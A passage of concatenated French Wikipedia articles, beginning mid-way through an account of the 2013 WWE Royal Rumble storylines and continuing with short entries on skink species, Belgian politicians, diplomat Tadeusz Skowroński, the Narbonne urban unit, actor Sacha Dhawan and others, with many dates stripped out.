Dolph Ziggler déclare par la suite le lors de "Raw" que Cena est entré dans le Royal Rumble pour , ce qui le pousse à annoncer qu'il y entrera lui-même pour . Cette même nuit, "3MB" (Heath Slater, Jinder Mahal et Drew Mcintyre) ont également annoncé qu'ils y serait présent eux aussi. La même semaine, le lors de "SmackDown", Antonio Cesaro déclare qu'il participera au Royal Rumble, ce qui fait de lui la huitième personne à annoncer sa participation. Trois jours plus tard, le , lors du de "Raw", Wade Barrett annonce lui aussi qu'il prendrait part au Royal Rumble. Ensuite, à "Main Event" le , The Miz confirme également sa participation à la bataille royale.
Lors du "Raw" du , Dolph Ziggler bat Randy Orton, Antonio Cesaro, The Miz, Sheamus et Wade Barrett dans un "Beat the Clock challenge" match pour bénéficier de l'opportunité de choisir l'ordre d'entrée de son choix. Après une altercation entre AJ Lee et Vickie Guerrero, la "Managing Supervisor" de "Raw", cette dernière le laissera choisir à quel moment il entrera dans le Royal Rumble, mais ne lui laisse que deux positions : premier ou deuxième. Plus tard, Darren Young, Titus O'Neil, "Team Hell No", Kofi Kingston, Brodus Clay, The Great Khali, "The Usos", Michael McGillicutty, Ryback et "Team Rhodes Scholars" confirment tous leur participation.
En outre, le , la WWE annonce sur son site qu'un tournoi de huit catcheurs de son académie de catch, sa division jeunes "NXT", sera organisé durant le "Fan Axxess" du "Royal Rumble", qui aura lieu au cours du week-end du "pay-per-view". Les huit catcheurs de "NXT" ayant participé au tournoi sont : Corey Graves, Oliver Grey, Luke Harper, Xavier Woods, Conor O'Brian, Oliver Neville, Leo Kruger et Bo Dallas. C'est finalement Bo Dallas qui remporte la compétition et reçoit ainsi l'opportunité de participer au Royal Rumble match, y entrant dans une position encore à déterminer.
Rivalité entre CM Punk et The Rock pour le WWE Championship.
Le , lors du 1000 épisode de "Raw", The Rock a annoncé qu'il disputerait un match pour le titre de la WWE au Royal Rumble. Peu de temps après, le champion de la WWE CM Punk, Daniel Bryan et John Cena ont affirmé chacun qu'ils feront face à The Rock. Plus tard cette nuit-là, The Rock a été attaqué et blessé par Punk alors qu'il venait en aide à John Cena qui subissent un assaut du Big Show après son match contre Punk pour le titre de la WWE. Par ailleurs, c'est lors de cette attaque que CM Punk effectue un "heel turn". Puis, successivement lors de "SummerSlam", "Night of Champions", "Hell in a Cell" et "Survivor Series" contre des adversaires tel que Ryback, John Cena et Big Show, Punk survit et donc conserve son titre. Mais deux semaines après les Survivors Series, Punk se blesse avoir reçu un "Powerbomb" de Ryback à travers une table, il a été annoncé que CM Punk ne défendrait pas son titre à "".
Malgré tout, le , lors de "Raw", Ryback annonce qu'il affrontera CM Punk le 7 janvier dans un Tables, Ladders &amp; Chairs match, puisqu'un match du même type entre eux deux devait avoir lieu lors du "" précédent mais fut remplacé par un 6-Man Tag team match entre la Team Hell No (Kane et Daniel Bryan) et Ryback contre "The Shield", match que Ryback perd. Subséquemment, lors du "Raw" , CM Punk affronte et bat Ryback dans un TLC match à la suite d'une intervention de "The Shield" qui empêche Ryback d'attraper la ceinture. CM Punk gagne le match en décrochant le titre et affrontera donc The Rock au Royal Rumble.
Deux semaines plus tard, lors de l'épisode de "Raw" du , "The Shield" attaquent The Rock alors qu'il parlait sur le ring, ce qui laisse soupçonner une éventuelle alliance entre le groupe et le champion CM Punk, chose ne pouvant pas malgré tout être prouvée. Cela poussera le président de la WWE, Mr. McMahon, à confronter CM Punk (accompagné de Paul Heyman) dans les vestiaires après l'attaque, et à lui annoncer que si "The Shield" interviennent dans son match contre The Rock au "Royal Rumble", il y aurait de « sévères conséquences ». McMahon annonce alors que si l'incident se reproduit, il s'impliquerait personnellement pour que CM Punk perde le WWE Championship, qui deviendrait alors vacant.
Rivalité entre Alberto Del Rio et Big Show pour le World Havyweight Championship.
Le à "SmackDown", le "General Manager" Booker T programme un "main event" où le champion poids-lourds Big Show défendra son titre contre Alberto Del Rio dans un Last Man Standing match. Ce dernier bat Big Show et devient le nouveau World Heavyweight Champion. Trois jours plus tard à "Raw", après avoir longtemps évoqué l'injustice du match qu'il avait livré à "SmackDown", n'étant , Big Show annonce qu'il invoquerait sa clause de revanche lors du "Royal Rumble". À Smackdown, Big show annonce à Booker T la stipulation de son match contre Alberto Del Rio au Royal Rumble Un Last Man Standing Match
Rivalité entre "Team Hell No" et "Team Rhodes Scholars" pour le WWE Tag Team Championship.
Bien qu’ils aient perdu leur match pour le WWE Tag Team Championship, le à "Main Event", Cody Rhodes et Damien Sandow ont rattrapé ce contretemps le à "Raw" : après que Daniel Bryan se fut blessé au genou en pleine compétition, Rhodes profite de la vulnérabilité de ce dernier pour lui porter le "Cross Rhodes". À la suite de leur victoire face aux champions en titres, "Team Rhodes Scholars" deviennent logiquement les prétendants au titre de WWE Tag Team Championship et affronteront "Team Hell No" lors du "Royal Rumble".
Rivalité entre Antonio Cesaro et The Miz pour le United States Championship.
Le , la WWE annonce que Antonio Cesaro défendra le United States Championship contre The Miz, notamment à cause de l'antagonisme qui existe entre les deux hommes, remontant d'ailleurs à l'épisode du de "Main Event". Leur rivalité se poursuit au cours des semaines qui suivent, pour culminer dans un match pour le titre de Cesaro lors du pré-show du "Royal Rumble".
Tableau des matchs.
Résultats du "Beat the Clock challenge match" du RAW du 21 janvier.
Le vainqueur de ce tournoi pourra choisir le numéro de son entrée dans le Royal Rumble match.
Entrées et éliminations du Royal Rumble match.
Le rouge indique un participant de Raw, le bleu un participant de SmackDown, le vert un invité exceptionnel et le jaune un participant de NXT.

</doc>
<doc id="6805746" url="https://fr.wikipedia.org/wiki?curid=6805746" title="Tropidophorus hangnam">
Tropidophorus hangnam

Tropidophorus hangnam est une espèce de sauriens de la famille des Scincidae.
Systématique.
L'espèce "Tropidophorus hangnam" a été décrite en 2005 par (1973-), (1950-2008), , et .
Répartition.
Cette espèce est endémique de la province de Chaiyaphum en Thaïlande.
Étymologie.
Le nom spécifique "hangnam" vient du thaïlandais "hang", la queue, et de "nam", l'épine, en référence à l'aspect de ce saurien.

</doc>
<doc id="6805765" url="https://fr.wikipedia.org/wiki?curid=6805765" title="Charte des droits du Mandé">
Charte des droits du Mandé



</doc>
<doc id="6805766" url="https://fr.wikipedia.org/wiki?curid=6805766" title="Alfons Siffer">
Alfons Siffer

Alphonse (Alfons) Frédéric Siffer, né le à Zomergem et décédé le est homme politique belge flamand, membre du parti catholique.
Biographie.
Siffer fut le du d'un soldat prussien. Il fit ses humanités à Saint-Nicolas, puis fut diplômé en droit et notariat (KUL et RUG). Il fut cofondateur du "Davidsfonds" à Gand (1875), de la société anonyme "Siffer-Léliart" (1877) et imprimeur, éditeur et libraire à Gand. Il se marie en 1879. Il fonde le magazine "Het Belfort" (1886) et devient en 1890 vice-président de la "Guilde des Artisans" à Gand.&lt;br&gt;
En 1895, il est élu conseiller communal de Gand, en 1896, il fonde le "Cercle bourgeois gantois", avant de devenir bourgmestre ff. (1909-11) en même temps qu'il est échevin des Travaux Publics et de la Santé Publique de Gand (1909-12).
Il est élu député de Gand-Eeklo (1912-1932) et devient premier échevin de Gand (1921-39). En 1933, son affaire est reprise par le "Standaard Boekhandel".

</doc>
<doc id="6805770" url="https://fr.wikipedia.org/wiki?curid=6805770" title="Tadeusz Skowroński">
Tadeusz Skowroński

Tadeusz Antoni Skowroński (Thaddée de Skowronski, Tadeu Skowronski, pseud. "Ludwik Karski", "Tadeu Prus)", né le à Varsovie et mort le à Fribourg en Suisse, est un diplomate et essayiste polonais. Docteur ès sciences politiques et économiques de l’université de Fribourg, docteur honoris causa de l’Institut des Avocats du Brésil, il fut envoyé extraordinaire et ministre plénipotentiaire de Pologne au Brésil de 1938 à 1945.
Jeunesse et éducation.
Il est issu d’une famille noble aux armoiries Tępa Podkowa . Son grand-père, Antoni Skowroński, participa à l’insurrection de Janvier 1861 et fut envoyé en Sibérie après la bataille de Miechów. Le père de Tadeusz, Roman Skowroński, était un médecin bien connu dans le royaume de Pologne et à Varsovie, notamment sous le nom de « protecteur de Powiśle » (quartier de Varsovie). Après la fin de ses études en médecine à Varsovie et des études complémentaires à Uppsala en Suède, il fonda l’Institut de gymnastique médicale et de physiothérapie en 1893 à Varsovie et, 10 ans plus tard, l’Association d’assistance des malades non-hospitalisés. Il épousa Zofia de Budny (1870-1967), mère de Tadeusz, qui naquit le à Varsovie. 
Le , Tadeusz Skowroński finit l’École polonaise secondaire de Wojciech Górski à Varsovie et, le , seulement quelques jours plus tard, il partit pour des vacances en Suisse avec ses parents et sa sœur Zofia. Au moment où la Première Guerre mondiale éclata, les parents de Tadeusz prirent la décision de l’inscrire à l’université de Fribourg. 
Le Tadeusz fut admis comme étudiant à l’université où il obtint sa licence ès sciences économiques et juridiques en 1917 et son doctorat ès sciences politiques l’année suivante. Ces années passées à Fribourg lui permirent de rencontrer des personnages importants de la minorité polonaise alors présents en Suisse : Józef Wierusz-Kowalski, Jan Modzelewski, Józef Puzyna et Tadeusz Romer. Pendant cette période, Tadeusz fut actif au sein du Comité général de l’aide aux victimes de la guerre en Pologne. Suivant les conseils de Jan Modzelewski, Tadeusz participa également activement à l’édition de l’encyclopédie polonaise initiée par Erazm Pilz.
Débuts de la carrière diplomatique.
En , Tadeusz Skowroński fut nommé secrétaire de la section économique du Comité national polonais à Paris et, deux mois plus tard, chef du bureau économique du même Comité, créé juste avant la conférence de paix organisée à Paris. En , Tadeusz partit pour Varsovie avec Konstanty Skirmunt dont il était le secrétaire et mena des négociations avec Józef Piłsudski. À son retour à Paris, il accepta le poste de secrétaire personnel de Roman Dmowski, (signataire polonais du traité de Versailles) mais il fut envoyé à Rome en tant que de la légation de Pologne début déjà. La situation militaire difficile traversée pendant la guerre polono-bolchévique décida Skowroński à partir pour Varsovie, pour rejoindre le régiment des Uhlans en en tant que soldat volontaire. Il participa aux batailles de Ciechanów, Pułtusk, Hrubieszów, Dubne, Równe, Kostopol et Zwiahel où Skowroński termina son activité militaire à la suite de l’armistice. Il rentra à Rome en . Après que son supérieur Konstanty Skirmunt ait accepté le poste de ministre des Affaires étrangères, il regagna Varsovie en tant que du cabinet du ministre. En compagnie de Skirmunt (d’abord envoyé puis ministre), Skowroński participa à plusieurs missions diplomatiques : à la conférence de San Remo ; à Bruxelles pour la région de Vilno ; à Prague pour négocier un traité frontalier ; et à Belgrade en tant qu’expert à la session économique des pays de la Petite Entente. Il voyagea également à Londres, à Paris et siégea à Gênes, à la conférence économique et financière qui se tint en avril-.
Travail à la centrale du ministère des Affaires étrangères.
Après les démissions simultanées de Wincenty Witos du cabinet de premier ministre et de Skirmunt du poste de ministre des Affaires étrangères en , Skowroński resta à Varsovie, au département de l’Europe centrale. En 1924, il prit le poste de responsable de bureau du Proche-Orient. En 1925, il fut nommé conseiller du ministère au degré professionnel. 
À cette époque également, en 1923 pour être précis, il fut délégué à la Conférence internationale de Lausanne et initiateur de la première Exposition industrielle polonaise à Constantinople. En , Skowroński partit pour la Perse en tant que délégué du gouvernement de la Pologne où il prit part à la cérémonie du couronnement du chah Reza Pahlavi. En Perse, il consacra son séjour aux négociations concernant le traité commercial polono-perse ainsi que le traité d’amitié. Ce dernier sera signé à Téhéran le .
Travail au sein des représentations de la Pologne à l’étranger.
Le , Tadeusz Skowroński commença son activité à la légation de Pologne à Bruxelles en tant que secrétaire de légation . Après une année d’activité, il rentra pour une courte période à Varsovie au début du mois de et prit le poste de premier secrétaire de la légation de Pologne à Berne en mai de la même année. À Berne, son talent diplomatique et son expérience de longue date se sont compétées. Durant ses presque six ans d’activité à ce poste, Skowroński soutint activement le développement des relations commerciales entre la Pologne et la Suisse. Le voyage qu’accomplirent des banquiers et industriels suisses en Pologne en 1929 constitue l’un des reflets de cette action. Les Suisses visitèrent des expositions à Poznań, le port de Gdynia – unique port polonais sur la mer Baltique à l’époque –, Varsovie, Cracovie, les usines de l’industrie lourde à Katowice et de l’industrie textile à Łódź. Skowroński participa également aux négociations du traité de commerce entre la Pologne et la Suisse, signé en 1933.
En tant que chargé d’affaires, Tadeusz Skowroński fut aussi responsable de l’ensemble de légation polonaise pendant les multiples voyages entrepris par Jan Modzelewski, chef de la légation polonaise, pour se rendre aux sessions de la Société des Nations à Genève. Nommé conseiller de légation en , il garda cette fonction jusqu’en . Skowroński prit alors la responsabilité du consulat général de Pologne à Amsterdam. Après deux mois de cours et de formation à Varsovie, il partit pour la Hollande en . Grâce à lui, le consulat organisa trois expositions ayant pour thèmes tour à tour le bois, l’agriculture et la philatélie. Skowroński fut aussi l’initiateur de deux sessions consulaires : celle des consuls de la mer du Nord à Amsterdam en 1936 d’abord, puis de la seconde consacrée aux questions de l’approvisionnement de la Pologne en cas de guerre à Varsovie en 1937.
La nomination au poste d’envoyé extraordinaire et ministre plénipotentiaire de la république de Pologne à Rio de Janeiro le fut la plus importante de la carrière diplomatique de Tadeusz Skowroński. Il mena ce travail à bien dans les conditions extrêmement difficiles de la période de la Deuxième Guerre mondiale. Skowroński dut affronter la propagande allemande, très active et disposant de fonds financiers presque inépuisables, dont le but était l’isolement diplomatique de la Pologne. La tâche était encore compliquée par la neutralité officielle du Brésil ainsi que le désintéressement et le manque de soutien de la part de deux puissances alliées de la Pologne : la France et la Grande-Bretagne. La légation ne recevait pas non plus de soutien financier ou d’instructions de la part du Gouvernement polonais en exil. Malgré toutes ces difficultés et la situation peu claire du gouvernement polonais et du président de la République – alors internés en Roumanie –, la reconnaissance du gouvernement polonais fut maintenue par le gouvernement brésilien. Et ceci, grâce aux négociations de Skowroński avec Oswaldo Aranha, le chef du ministère des Affaires étrangères du Brésil.
Depuis le premier jour de la guerre déjà, Skowroński s’employa dans une action d’information pour toute la communauté polonaise du Brésil (200’000 personnes environ). Avec des moyens assez limités, il influença la forme et le contenu des articles publiés dans la presse brésilienne sur la situation en Pologne. Ses larges contacts dans le milieu politique et ses connaissances du monde des finances lui permirent d’organiser le comité de l’aide aux victimes de la guerre en Pologne. Sa femme Chrystyna y joua un rôle très important.
L’activité en exil.
En , au moment où la reconnaissance du gouvernement polonais en Exil fut retirée par le gouvernement brésilien, Skowroński décida de rester à l’étranger. Il obtint un poste à l’université pontificale catholique de Rio de Janeiro. Il lança également une activité commerciale. Ses premières entreprises, une confiserie / salon de thé et une société d’import-export, n’ont pas porté de fruits. Le succès vint de sa collaboration avec Alfred Jurzykowski. Tous deux ouvrirent une usine de camions Mercedes-Benz, en 1949. Skowroński devint aussi le représentant de la Fondation Jurzykowski au Brésil, organisation qui soutenait les scientifiques et artistes d’origine polonaise. Tadeusz Skowroński fut en outre actif dans plusieurs organisations polonaises et participa aux émissions du Centre brésilien de l’Europe libre, diffusées trois fois par semaine sur les ondes de la radio Tamaio de Rio de Janeiro.
Publications.
Adolescent déjà, après son arrivée à Berne en 1914, Tadeusz Skowroński commença à écrire en rédigeant un journal. L’écriture allait déboucher en 1966 sur la publication de ses observations des premières années de la Deuxième Guerre mondiale : « Wojna polsko-niemiecka widziana z Brazylii 1939-1940 » (« La guerre polono-allemande vue du Brésil 1939-1940 »). Les mémoires de la période précédente furent quant à eux publiés en 1999 sous le titre « Pamiętniki 1914-1939 Student w Szwajcarii – Dyplomata wolnej Polski» (« Mémoires 1914-1939 Étudiant en Suisse – Diplomate de la Pologne Libre). Dans l’avant-propos du livre, Stefan K. Kuczyński présente Tadeusz comme un : « participant à de multiples événements importants, témoin de son présent, qu’il sait décrire avec intérêt et un grand sens de l’observation. De nombreuses réflexions très personnelles révèlent une vie intérieure très riche et une grande sensibilité ». Kuczyński relève également son patriotisme polonais effervescent et de forts liens familiaux.
La carrière diplomatique que Skowroński commença après la Première Guerre mondiale ne l’empêcha pas de continuer à rédiger et publier de nombreux textes. En , il présenta les négociations polono-turques avant la signature du traité d’amitié dans un article publié par le quotidien « Świat » (« Le Monde »). Dans les années 1930, il fut correspondant pour la « Przegląd Współczesny » (« Revue Contemporaine ») et auteur de multiples études sur le régime et la politique suisses.
Au moment où la Deuxième Guerre mondiale éclata, Skowroński mena une activité rédactionnelle, visant à défendre la raison de l’État polonais. Un certain nombre de ses articles parurent dans la presse brésilienne à Sao Paulo, Rio de Janeiro, Curitiba, mais aussi à Buenos Aires en Argentine. Il fut également l’auteur d’une anthologie des opinions brésiliennes sur la Pologne, écrites à partir de 1830 : « Paginas Brasileiras sobre a Polonia » (« Pages brésiliennes concernant la Pologne ») et finalement éditée en 1942 à Rio de Janeiro. Il écrivit aussi des articles traitant de politique, d’économie et de démographie, publiés dans « Mercure de France », « Wiadomości Polskie » (« Informations polonaises ») de Montréal, et des périodiques de l’émigration polonaise à Londres tels que « Wiadomości » (« Informations »), « Dziennik Polski i Dziennik Żołnierza » (« Journal polonais et Journal du soldat »). 
Grâce à cette activité, Skowroński reste connu comme l’auteur de près de 90 études et articles. Il faut souligner que sa position internationale fut l’objet d’un nombre important de ces articles (plus que 70).
Famille, vie privée.
Tadeusz Skowroński fut marié deux fois. Le , il épousa Chrystyna Maria Melania Turno (née le à Słomowo), fille de Jan et Ludwika née comtesse Mycielska. Elle reçut en dot le domaine de Torzeniec (1436 hectares) que Tadeusz Skowroński géra avec le plus grand soin. Malgré ses nombreuses absences causées par ses activités diplomatiques, il reconstruisit le manoir et planta le parc. Il développa aussi les cultures de blé, de pommes de terre, d’oignons ainsi que l’élevage de poissons et de bétail. Skowroński révèle son attachement particulier à ces biens notamment dans son livre, riche de ses propres illustrations. Le livre, trilingue et intitulé « Szczęśliwe dni spędzone w Torzeńcu » (« Jours heureux à Torzeniec »), fut rédigé à l’attention de son petit-fils Jean. Sur la base de ce livre, la télévision polonaise réalisa un documentaire de 40 minutes, que l’on peut voir sur YouTube.
Après le décès de Chrystyna survenu le , Tadeusz Skowroński retourna en Europe en 1964. Il se maria pour la seconde fois, au Vatican, le avec Mercedes de Fischer (1898 - 1991), sœur de l’ambassadeur Henry Beat von Fischer. Elle était veuve d’Heinrich Pfyffer von Altishofen (1898 – 1957, le commandant de la Garde suisse pontificale). Jusqu’à 1971 Skowroński habitat Rome et il partit ensuite pour Fribourg en Suisse, ce lieu qu’il avait si bien connu dans sa jeunesse déjà y ayant fait ses études. Tadeusz Skowroński mourut le et fut enterré au cimetière Saint-Léonard à Fribourg. Il a quatre fils, tous nés de son premier mariage avec Chrystyna : Roman (né le 15.07.1928, décédé le 19.10.1994), Krzysztof (né le 22.11.1929, décédé le 26.12.2006), Dominik (né le 4.12.1933) et Marek (né le 25.05.1936, décédé le 9.12.2014). 

</doc>
<doc id="6805771" url="https://fr.wikipedia.org/wiki?curid=6805771" title="Unité urbaine de Narbonne">
Unité urbaine de Narbonne

L'unité urbaine de Narbonne est une unité urbaine française centrée sur la ville de Narbonne, une des sous-préfectures de l'Aude et première agglomération de ce département, en région Occitanie. 
Données générales.
Dans le zonage réalisé par l'Insee en 2010, l'unité urbaine était composée d'une seule commune, qui constituait une ville isolée.
Dans le nouveau zonage réalisé en 2020, elle est toujours composée d'une seule commune, comme sept autres unités urbaines de plus de que sont Agde, Beaune, Montaigu-Vendée, Rambouillet, La Roche-sur-Yon, Les Sables-d'Olonne et Saint-Malo. Elle est la plus peuplée des huit unités urbaines de plus de de la France métropolitaine définies comme "ville isolée" c'est-à-dire ne présentant pas de continuité urbaine avec des communes limitrophes.
En , avec , elle représente la première unité urbaine du département de l'Aude avant l'unité urbaine de Carcassonne qui occupe le départemental. Elles forment, à elles deux, les seules unités urbaines de plus de du département. Elle occupe le en région Occitanie, après l'unité urbaine de Castres ( régional) et avant l'unité urbaine de Lunel qui se positionne au régional.
En 2022, sa densité de population s'élève à . Par sa superficie, elle représente 2,82 % du territoire départemental mais, par sa population, elle regroupe 15 % de la population du département de l'Aude.
Composition 2020 de l'unité urbaine.
Elle est composée de la ville isolée suivante :

</doc>
<doc id="6805772" url="https://fr.wikipedia.org/wiki?curid=6805772" title="Sacha Dhawan">
Sacha Dhawan

Sacha Dhawan est un acteur britannique né en 1984 à Bramhall, District métropolitain de Stockport, Grand Manchester.
Il tient notamment le rôle dans la pièce et le film "History Boys" de Nicholas Hytner. Il est également connu pour avoir tenu le rôle de Manmeet dans la série "Outsourced", mais aussi pour son rôle du Maître dans la série télévisée de science-fiction "Doctor Who". 
Biographie.
Sacha Dhawan a fait ses études à l'Aquinas College a Stockport. 
En 2004, il obtient le rôle d'Akthar dans la pièce d'Alan Bennett "The History Boys" mise en scène par Nicholas Hytner. En 2006, il reprend le rôle pour jouer dans le film tiré de la pièce, aux côtés de Dominic Cooper, Frances de la Tour, Richard Griffiths et Russell Tovey.
Pour sa prestation dans le téléfilm "Bradfort Riot", il gagne un Royal television society awards. 
En 2010, il rejoint le casting de la série de la NBC "Outsourced", série qui s'arrête au bout d'une saison.
En 2012, il retrouve Nicola Walker, sa partenaire dans la mini-série "The Last Train" et dans la série de la BBC "Last Tango in Halifax".
Sacha Dhawan joue en 2013 dans le téléfilm "An Adventure in Space and Time" de Mark Gatiss diffusé à l'occasion du de la série "Doctor Who". Il y interprète le rôle de Waris Hussein, le réalisateur des premiers épisodes de la série "Doctor Who", aux côtés de David Bradley, Jessica Raine et Brian Cox.
Il retourne, la même année, avec Mark Gatiss pour "The Tractate Middoth".
En 2020, il apparaît dans la douzième saison de "Doctor Who" sous les traits du Maître, succédant ainsi à Michelle Gomez dans le rôle de la Némésis légendaire du Docteur.

</doc>
<doc id="6805781" url="https://fr.wikipedia.org/wiki?curid=6805781" title="Sauroscincus braconnieri">
Sauroscincus braconnieri



</doc>
<doc id="6805782" url="https://fr.wikipedia.org/wiki?curid=6805782" title="Tropidoscincus aubrianus">
Tropidoscincus aubrianus

Tropidoscincus aubrianus est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique de Nouvelle-Calédonie.
Étymologie.
Cette espèce est nommée en l'honneur de Charles Eugène Aubry-Lecomte (1821–1879).

</doc>
<doc id="6805785" url="https://fr.wikipedia.org/wiki?curid=6805785" title="Rudno">
Rudno

Rudno désigne notamment :

</doc>
<doc id="6805790" url="https://fr.wikipedia.org/wiki?curid=6805790" title="Tropidolopisma variabilis">
Tropidolopisma variabilis



</doc>
<doc id="6805791" url="https://fr.wikipedia.org/wiki?curid=6805791" title="Leiolopisma variabile">
Leiolopisma variabile



</doc>
<doc id="6805792" url="https://fr.wikipedia.org/wiki?curid=6805792" title="Lygosoma roehssii">
Lygosoma roehssii



</doc>
<doc id="6805793" url="https://fr.wikipedia.org/wiki?curid=6805793" title="Tropidoscincus roehssii">
Tropidoscincus roehssii



</doc>
<doc id="6805794" url="https://fr.wikipedia.org/wiki?curid=6805794" title="Tropidoscincus variabilis">
Tropidoscincus variabilis

Tropidoscincus variabilis est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique de Nouvelle-Calédonie.

</doc>
<doc id="6805801" url="https://fr.wikipedia.org/wiki?curid=6805801" title="Tropidoscincus boreus">
Tropidoscincus boreus

Tropidoscincus boreus est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique de Nouvelle-Calédonie.

</doc>
<doc id="6805802" url="https://fr.wikipedia.org/wiki?curid=6805802" title="Crown of Creation (groupe de musique)">
Crown of Creation (groupe de musique)



</doc>
<doc id="6805804" url="https://fr.wikipedia.org/wiki?curid=6805804" title="Nouvelle résistance populaire">
Nouvelle résistance populaire



</doc>
<doc id="6805806" url="https://fr.wikipedia.org/wiki?curid=6805806" title="Maoïsme spontanéiste">
Maoïsme spontanéiste



</doc>
<doc id="6805807" url="https://fr.wikipedia.org/wiki?curid=6805807" title="Eugène Standaert">
Eugène Standaert

Eugène Hippolyte Ghislain Standaert, né le à Bruges et décédé le à Renaix est homme politique belge flamand, membre du parti catholique.
Il fut docteur en droit.

</doc>
<doc id="6805808" url="https://fr.wikipedia.org/wiki?curid=6805808" title="Leandre (comédia dell'arte)">
Leandre (comédia dell'arte)



</doc>
<doc id="6805809" url="https://fr.wikipedia.org/wiki?curid=6805809" title="Anarcho-maoïsme">
Anarcho-maoïsme



</doc>
<doc id="6805810" url="https://fr.wikipedia.org/wiki?curid=6805810" title="Anatoly Petrovich Alexandrov">
Anatoly Petrovich Alexandrov



</doc>
<doc id="6805813" url="https://fr.wikipedia.org/wiki?curid=6805813" title="Points of View">
Points of View

 est un album du Dave Holland Quintet sorti en 1998.
Description.
Pour cet album, Dave Holland affirme être particulièrement influencé par Duke Ellington dans l’approche par les variations rythmiques, les contrepoints mélodiques et la façon d’écrire une mélodie en ayant le soliste qui va la jouer en tête. Malgré cette influence, la musique est loin d’Ellington et caractérise un son post-bop moderne. Le set contient huit morceaux très divers ce qui n’empêche pas une unité d’ensemble grâce à la direction de Holland et à la répartition égale du temps de parole pour chaque soliste.
Titres.
Sauf indication, tous les titres sont composés par Dave Holland

</doc>
<doc id="6805814" url="https://fr.wikipedia.org/wiki?curid=6805814" title="Ghdafna Ould Eyih">
Ghdafna Ould Eyih

Aghdhefna Ould Eyih (né le à Atar) est le Ministre des Pêches et de l'Économie maritime de Mauritanie du au 20 août 2014.Il est titulaire d'un doctorat en mécanique de l'École centrale de Lyon en 1993. Il a effectué toutes ses études supérieures entre Lille et Lyon en France.
Parcours.
Avant sa nomination comme Ministre des Pêches et de l'Économie maritime, Aghdhefna Ould Eyih a commencé sa carrière en comme Enseignant Vacataire à la Faculté Sciences et Techniques de l'Université de Nouakchott. De 1998 à 2001 il est cadre auprès de la Direction générale de l'Établissement National de l'Entretien Routier (ENER). De 2001 à 2003 il occupe le poste de Directeur technique de la société AGRINEQ en Mauritanie. 
En 2004 il devient Directeur des travaux de l'ENER, avant d'occuper le poste de Directeur général adjoint de la même entreprise en 2008. Puis directeur général adjoint de la société nationale des aménagements agricoles et des travaux.
Il est du 22 mars 2011 au 20 août 2014, Ministre des Pêches et de l'Économie maritime de son pays.

</doc>
<doc id="6805816" url="https://fr.wikipedia.org/wiki?curid=6805816" title="Axel Strobye">
Axel Strobye



</doc>
<doc id="6805817" url="https://fr.wikipedia.org/wiki?curid=6805817" title="Rudno (Petite-Pologne)">
Rudno (Petite-Pologne)

Rudno est un village de Pologne, située dans le sud du pays, dans la voïvodie de Petite-Pologne. Il fait partie de la gmina de Krzeszowice, dans le powiat de Cracovie.

</doc>
<doc id="6805818" url="https://fr.wikipedia.org/wiki?curid=6805818" title="Jack Womack">
Jack Womack

Jack Womack, né le à Lexington au Kentucky, est un écrivain américain de science-fiction. Il est célèbre notamment pour sa série de romans uchroniques "Dryco".

</doc>
<doc id="6805825" url="https://fr.wikipedia.org/wiki?curid=6805825" title="Artanoudji">
Artanoudji



</doc>
<doc id="6805830" url="https://fr.wikipedia.org/wiki?curid=6805830" title="Amédée Visart de Bocarmé">
Amédée Visart de Bocarmé

Le comte Amédée Charles Louis Visart de Bocarmé, né le à Sint-Kruis et décédé le à Bruges, est un homme politique belge flamand, membre du parti catholique.
Biographie.
Amédée Charles Louis Visart de Bocarmé, né le à Sainte-Croix près de Bruges, fait partie d'une ancienne famille du Tournaisis. En 1743, Louis-François Visart obtient reconnaissance de noblesse avec le titre de comte. Amédée obtient le titre, transmissible par ordre de primogéniture masculine, en 1886. Il est le fils du comte Marie Jean Joseph Visart de Bocarmé (1794-1855) et de son épouse Marie-Thérèse de Man (1802-1883). Son père est bourgmestre de Sainte-Croix-lez-Bruges et chef-homme de la Gilde de Saint-Sébastien à Bruges. Sa naissance a lieu au château familial de Rooighem à Sainte-Croix, qui demeurera une demeure familiale jusque 1999.
En 1864, Visart épouse Émilie Faignart (1838-1875) et il convole en secondes noces avec la comtesse Nathalie van den Steen de Jehay (1852-1919). Du premier mariage naissent Étienne (1865-1951), Albert (1868-1947) et Valentine (1867-1949).
Reçu docteur en droit (1860) à l'Université catholique de Louvain, Visart s'inscrit comme avocat au barreau de Gand (1860-68).
Il est président de l'Académie des beaux-Arts de Bruges (1884-1924) et de la Société Royale Forestière (1893-1924).
Il est élu député (1864 ; 1868-1923), conseiller communal (1875), puis bourgmestre (1876-1924) de Bruges.
Son portrait par Flori Van Acker, peint à l'occasion du jubilé de son cinquantième anniversaire comme bourgmestre est accroché dans une salle de l'hôtel de ville de Bruges.
Archives.
En 2014 le comte Étienne-Amédée Visart de Bocarmé a fait don d'une partie importante des archives familiales aux Archives de la ville de Bruges.
Une grande partie de ces archives provient du bourgmestre Visart.

</doc>
<doc id="6805831" url="https://fr.wikipedia.org/wiki?curid=6805831" title="Sodeb'O (voilier)">
Sodeb'O (voilier)



</doc>
<doc id="6805833" url="https://fr.wikipedia.org/wiki?curid=6805833" title="Rudawa">
Rudawa

Rudawa peut désigner en Pologne :

</doc>
<doc id="6805834" url="https://fr.wikipedia.org/wiki?curid=6805834" title="Anémone marguerite">
Anémone marguerite



</doc>
<doc id="6805836" url="https://fr.wikipedia.org/wiki?curid=6805836" title="Francis Nielsen">
Francis Nielsen

Francis Nielsen, né le à Annecy, est un réalisateur français.
Biographie.
Il commence sa longue carrière audiovisuelle en jouant des spectacles de marionnettes dans les écoles maternelles. Puis, après une période d'activités diverses, il intègre le Studio IDEFIX, créé par René Goscinny et Albert Uderzo, les auteurs d"'Asterix", "Lucky Luke" C'est là qu’il découvre le monde de l'animation. C’est en qualité de réalisateur qu'il démarre sur "Les Douze Travaux d'Astérix" et "La Ballade des Dalton".
Tout en réalisant de nombreuses animations pour la publicité et les séries télévisées, il devient lui-même producteur au sein des deux sociétés qu'il crée, STOUT Studio et ROOSTER Studio. Il est actuellement réalisateur pour la télévision et le cinéma. Il fut le premier réalisateur d’un film d’animation à entrer dans la Sélection Officielle de la Mostra de Venise avec "Le Chien, le Général et les Oiseaux".

</doc>
<doc id="6805844" url="https://fr.wikipedia.org/wiki?curid=6805844" title="Typhlacontias bogerti">
Typhlacontias bogerti



</doc>
<doc id="6805845" url="https://fr.wikipedia.org/wiki?curid=6805845" title="Marmalade">
Marmalade

 est un groupe de rock écossais originaire de Glasgow.
